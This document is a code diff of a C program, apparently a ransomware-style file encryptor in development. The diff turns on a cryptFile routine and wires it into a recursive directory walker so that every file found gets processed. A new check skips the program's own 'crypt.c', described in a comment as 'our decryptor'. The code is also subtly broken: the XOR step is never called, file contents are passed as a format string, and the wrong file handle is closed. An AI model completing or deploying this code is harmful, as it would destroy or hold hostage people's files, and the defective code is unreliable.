@@ -15,34 +15,35 @@ void xorString (char *s) {
 	}
 }
 
-// void cryptFile(char *filename) {
+void cryptFile(char *filename) {
 
-//     // Read Buffer
-//     FILE *f = fopen(filename, "r+");
-//     fseek(f, 0, SEEK_END);
-//     long fsize = ftell(f);
-//     fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
-//     char *contents = malloc(fsize + 1);
-//     fread(contents, 1, fsize, f);
-//     fclose(f);
+    // Read Buffer
+    FILE *f = fopen(filename, "r+");
+    fseek(f, 0, SEEK_END);
+    long fsize = ftell(f);
+    fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
+    char *contents = malloc(fsize + 1);
+    fread(contents, 1, fsize, f);
+    fclose(f);
 
-//     // Display
-//     contents[fsize] = 0;
-//     printf("\n%s\n", contents);
+    // Write Buffer
+    FILE *fp = fopen(filename, "w+");
+    fprintf(fp, contents);
+    fclose(f);
+    f = NULL;
+}
 
-//     // Write Buffer
-//     FILE *fp = fopen(filename, "w+");
-//     fprintf(fp, contents);
-//     fclose(f);
-//     f = NULL;
-// }
-
-int isFile(char filename[]) {
+int isValidFile(char filename[]) {
     char str1[] = ".", str2[] = "..";
+    // Some "files" are just inodes we want to skip over
     if (strcmp(filename, str1) == 0) {
         return -1;
     }
     if (strcmp(filename, "..") == 0) {
+        return -1;
+    }
+    // We definitely don't want to encrypt our decryptor...
+        if (strcmp(filename, "crypt.c") == 0) {
         return -1;
     }
 
@@ -68,23 +69,22 @@ char **ListFiles(char *dir_name, char *previous_dir) {
     strcpy(full_dir_name, previous_dir);
     strcat(full_dir_name, dir_name);
     strcat(full_dir_name, "/");
-    // printf("Current working dir: %s\n", full_dir_name);
 
     d = opendir(full_dir_name);
     if (d)
     {
         while ((dir = readdir(d)) != NULL)
         {   
-            if (isFile(dir->d_name) == 0) {
+            int valid = isValidFile(dir->d_name);
+            if (valid == 0) {
                 files[i++] = dir->d_name;
-                
                 char full_file_name[1024];
                 strcpy(full_file_name, full_dir_name);
                 strcat(full_file_name, dir->d_name);
                 printf("%s\n", full_file_name);
+                cryptFile(full_file_name);
             }
-            else if (isFile(dir->d_name) == 1) {
-                // printf(">>> %s\n", dir->d_name);
+            else if (valid == 1) {
                 ListFiles(dir->d_name, full_dir_name);
             }
         }
